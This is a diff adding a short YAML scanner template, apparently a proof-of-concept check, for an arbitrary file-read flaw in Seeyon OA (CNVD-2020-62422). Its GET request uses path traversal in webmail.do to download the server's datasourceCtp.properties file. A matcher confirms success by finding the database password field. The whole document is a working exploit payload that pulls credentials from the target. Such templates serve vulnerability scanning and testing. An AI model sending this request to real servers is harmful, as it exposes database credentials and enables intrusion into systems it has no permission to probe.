@@ -1,0 +1,13 @@
+name:
+  - "Seeyon readfile(CNVD-2020-62422)"
+url:
+  - "/seeyon/webmail.do?method=doDownloadAtt&filename=index.jsp&filePath=../conf/datasourceCtp.properties"
+method:
+  - "GET"
+data:
+  - ""
+matchers:
+  - Status:
+      - 200
+  - Regex:
+      - "ctpDataSource.password"
